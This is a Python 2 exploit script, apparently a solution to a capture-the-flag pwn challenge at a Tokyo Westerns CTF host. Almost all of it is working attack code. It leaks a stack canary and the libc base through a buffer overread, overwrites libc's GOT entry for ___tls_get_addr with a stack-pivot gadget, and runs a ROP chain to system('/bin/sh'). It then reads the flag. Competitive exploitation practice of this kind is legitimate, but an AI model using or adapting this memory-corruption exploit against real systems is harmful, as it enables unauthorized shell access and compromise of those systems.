#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "pwn2.chal.ctf.westerns.tokyo"
    PORT = 18294

DBG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

# we overwrite the GOT of libc itself
# target ___tls_get_addr which is called
# during the exit process

# leak stack cookie cookie
buf = "A" * 32
buf += "B"
rtil(": ")
s.send("abcd\n")
rtil(": ")
s.send("-1\n")
rtil(": ")
s.send(buf)

leak = rtil(": ")
leak = leak.split("> ")[1]
leak = leak.split(buf)[1]
leak = leak[0:3]
leak = leak.rjust(4, "\x00")
leak = u32(leak)
cookie = leak
print "stack cookie: %s"%hex(cookie)

################
# leak libc base
stchk_fail_got = 0x08049fdc
offset_to_base =  -0x00019af3

buf = "A" * 32
buf = buf.ljust(52, "Z")
buf += p32(stchk_fail_got)
buf = buf.ljust(168 + 32, "Z")
s.send("n\n")
rtil(": ")
s.send("-1\n")
rtil(": ")
s.send(buf)

leak = rtil(": ")
leak = leak.split("> ")[1]
leak = leak.split(buf)[1]
leak = leak[0:4]
leak = u32(leak)
lc_start_main = leak
lc_base = lc_start_main + offset_to_base
print "libc base: %s"%hex(lc_base)

####################
# overwrite libc got
sh = lc_base + 0x11cfe
system = lc_base + 0x00040310
lc_tls_get_addr_got = lc_base + 0x1ab030

buf = "A" * 32
buf += p32(cookie)
buf = buf.ljust(52, "Z")
buf += p32(lc_tls_get_addr_got)          # namebuf
buf += p32(0x41414141)
buf += p32(4)                            # num iterations
buf += "K" * 116

# rop chain
buf += p32(system) + p32(0x41414141) + p32(sh)

s.send("-1\n")
rtil(": ")
s.send(buf)
rtil(": ")

###############################
# overwrite with add esp gadget
# to fall on rop chain above ^
add_esp = lc_base + 0x1197fa

buf = p32(add_esp)
rtil(": ")
s.send("y\n")
rtil(": ")
s.send(buf + "\n")
rtil(": ")
s.send("10\n")
s.send("a\n")
rtil("Bye!\n")
s.send("cat flag\n")
print rtil("}")
